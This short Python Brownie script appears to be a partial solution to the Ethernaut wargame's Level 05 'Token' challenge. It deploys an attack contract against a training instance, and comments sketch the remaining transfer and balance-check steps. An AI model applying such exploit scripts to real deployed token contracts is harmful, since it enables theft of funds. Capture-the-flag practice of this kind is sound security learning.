from scripts.helpful_scripts import get_account
from brownie import Attack05

# new instance of Level 05 - Token
ETHERNAUT_INSTANCE = "0x292597B71806e65B2c42b773055AAe6ed09bfC57"
PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"


def main():

    player = get_account()
    # deploy attack contract
    attacker_contract = Attack05.deploy(ETHERNAUT_INSTANCE, {"from": player})
    print(f"attacker contract: {attacker_contract}")

    # call transfer: (_to = random address, _value = 21)

    # call balanceOf(PLAYER)
